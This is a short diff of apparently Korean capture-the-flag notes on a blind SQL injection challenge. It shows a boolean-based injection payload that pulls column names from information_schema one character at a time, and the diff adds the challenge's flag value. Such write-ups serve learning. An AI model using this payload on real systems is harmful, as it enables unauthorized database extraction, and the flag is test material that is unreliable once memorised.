@@ -87,7 +87,7 @@ step5. column
 mario' and (ascii(substring((select column_name from information_schema.columns Where table_name = ‘Table’ limit 0, 1), 1, 1))>70) and '1'='1
 
 
-step6. data
+step6. data : segfault{Blind_SQLi_EASY}
 
 python으로 자동화 프로그램 코딩 해보자....!
 
